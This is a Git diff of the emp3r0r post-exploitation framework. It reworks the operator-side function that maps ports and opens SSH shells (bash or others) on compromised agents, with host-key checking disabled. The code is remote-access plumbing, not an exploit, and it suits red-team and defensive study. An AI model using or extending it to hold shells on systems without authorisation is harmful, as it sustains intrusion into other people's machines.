@@ -10,37 +10,56 @@ import (
 	"time"
 
 	"github.com/google/uuid"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // shell - port mapping
-var shellPort = make(map[string][]string)
+// one port for one shell
+var SSHShellPort = make(map[string]string)
 
 // SSHClient ssh to sshd server, with shell access in a new tmux window
+// shell: the executable to run, eg. bash, python
+// port: serve this shell on agent side 127.0.0.1:port
 func SSHClient(shell, port string) (err error) {
 	if !util.IsCommandExist("ssh") {
 		err = fmt.Errorf("ssh must be installed")
 		return
 	}
 
+	// bash or not
+	lport := strconv.Itoa(util.RandInt(2048, 65535)) // shell gets mapped here
+	new_port := strconv.Itoa(util.RandInt(2048, 65535))
+	if port == emp3r0r_data.SSHDPort && shell != "bash" {
+		port = new_port // reset port if trying to open shells other than bash
+		SetOption([]string{"port", new_port})
+		CliPrintWarning("Switching to a new port %s since we are not requesting bash", port)
+	}
+	if shell == "bash" {
+		port = emp3r0r_data.SSHDPort // default shell is bash, on a random default port
+		SetOption([]string{"port", emp3r0r_data.SSHDPort})
+		CliPrintWarning("Switching to default bash port %s", emp3r0r_data.SSHDPort)
+	}
+	to := "127.0.0.1:" + port // decide what port/shell to connect to
+
 	// is port mapping already done?
-	lport := strconv.Itoa(util.RandInt(2048, 65535))
-	to := "127.0.0.1:" + port
 	exists := false
 	for _, p := range PortFwds {
 		if p.Agent == CurrentTarget && p.To == to {
 			exists = true
-			for s, ports := range shellPort {
-				for _, p := range ports {
-					if port == p && s != shell {
-						new_port := strconv.Itoa(util.RandInt(2048, 65535))
-						CliPrintWarning("Port %s has %s shell on it, restarting with a different port %s", port, s, new_port)
-						SetOption([]string{"port", new_port})
-						SSHClient(shell, new_port)
-						return
-					}
+			for s, p := range SSHShellPort {
+				// one port for one shell
+				// if trying to open a different shell on the same port, change to a new port
+				if s != shell && p == port {
+					new_port := strconv.Itoa(util.RandInt(2048, 65535))
+					CliPrintWarning("Port %s has %s shell on it, restarting with a different port %s", port, s, new_port)
+					SetOption([]string{"port", new_port})
+					SSHClient(shell, new_port)
+					return
 				}
 			}
+			// if a shell is already open, use it
+			CliPrintWarning("Using existing port mapping %s -> remote:%s for shell %s", p.Lport, port, shell)
 			lport = p.Lport // use the correct port
 			break
 		}
@@ -69,7 +88,7 @@ func SSHClient(shell, port string) (err error) {
 					if strings.Contains(res, "success") {
 						break
 					} else {
-						err = fmt.Errorf("Start sshd failed: %s", res)
+						err = fmt.Errorf("Start sshd (%s) failed: %s", shell, res)
 						return
 					}
 				}
@@ -77,7 +96,7 @@ func SSHClient(shell, port string) (err error) {
 		}
 
 		// set up port mapping for the ssh session
-		CliPrintInfo("Setting up port mapping for sshd")
+		CliPrintInfo("Setting up port mapping (local %s -> remote %s) for sshd (%s)", lport, to, shell)
 		pf := &PortFwdSession{}
 		pf.Ctx, pf.Cancel = context.WithCancel(context.Background())
 		pf.Lport, pf.To = lport, to
@@ -85,7 +104,7 @@ func SSHClient(shell, port string) (err error) {
 			err = pf.RunPortFwd()
 			if err != nil {
 				err = fmt.Errorf("PortFwd failed: %v", err)
-				CliPrintError("Start port mapping for sshd: %v", err)
+				CliPrintError("Start port mapping for sshd (%s): %v", shell, err)
 			}
 		}()
 		CliPrintInfo("Waiting for response from %s", CurrentTarget.Tag)
@@ -121,9 +140,9 @@ wait:
 	}
 	sshCmd := fmt.Sprintf("%s -p %s -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1",
 		sshPath, lport)
-	CliPrintSuccess("Opening SSH session for %s in new window. "+
+	CliPrintSuccess("Opening SSH (%s - %s) session for %s in new window. "+
 		"If that fails, please execute command %s manaully",
-		CurrentTarget.Tag, strconv.Quote(sshCmd))
+		shell, port, CurrentTarget.Tag, strconv.Quote(sshCmd))
 
 	// agent name
 	name := CurrentTarget.Hostname
@@ -133,6 +152,6 @@ wait:
 	}
 
 	// remeber shell-port mapping
-	shellPort[shell] = append(shellPort[shell], port)
-	return TmuxNewWindow(fmt.Sprintf("%s-%s-%s", name, shell, port), sshCmd)
+	SSHShellPort[shell] = port
+	return TmuxNewWindow(fmt.Sprintf("emp3r0r_shell-%d/%s/%s-%s", util.RandInt(0, 1024), name, shell, port), sshCmd)
 }
